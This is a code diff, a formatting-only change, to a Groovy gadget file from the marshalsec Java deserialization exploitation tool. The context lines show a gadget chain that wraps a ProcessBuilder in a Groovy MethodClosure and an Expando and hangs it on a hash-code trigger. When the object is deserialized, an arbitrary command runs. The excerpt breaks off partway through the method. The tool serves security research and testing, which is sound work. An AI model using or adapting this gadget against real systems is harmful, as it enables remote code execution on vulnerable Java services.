@@ -23,37 +23,35 @@ SOFTWARE.
 package marshalsec.gadgets;
 
 
-import org.codehaus.groovy.runtime.MethodClosure;
-
 import groovy.util.Expando;
 import marshalsec.MarshallerBase;
 import marshalsec.UtilFactory;
+import org.codehaus.groovy.runtime.MethodClosure;
 
 
 /**
  * @author mbechler
- *
  */
 public interface Groovy extends Gadget {
 
     @Primary
-    @Args ( minArgs = 1, args = {
-        "cmd", "args.."
+    @Args(minArgs = 1, args = {
+            "cmd", "args.."
     }, defaultArgs = {
-        MarshallerBase.defaultExecutable
-    } )
-    default Object makeGroovyMap ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultExecutable
+    })
+    default Object makeGroovyMap(UtilFactory uf, String[] args) throws Exception {
         Object e = makeGroovy(args);
         return uf.makeHashCodeTrigger(e);
     }
 
 
-    @Args ( minArgs = 1, args = {
-        "cmd", "args.."
+    @Args(minArgs = 1, args = {
+            "cmd", "args.."
     }, defaultArgs = {
-        MarshallerBase.defaultExecutable
-    } )
-    default Object makeGroovy ( String[] args ) throws Exception {
+            MarshallerBase.defaultExecutable
+    })
+    default Object makeGroovy(String[] args) throws Exception {
         Expando expando = new Expando();
         ProcessBuilder pb = new ProcessBuilder(args);
         MethodClosure mc = new MethodClosure(pb, "start");
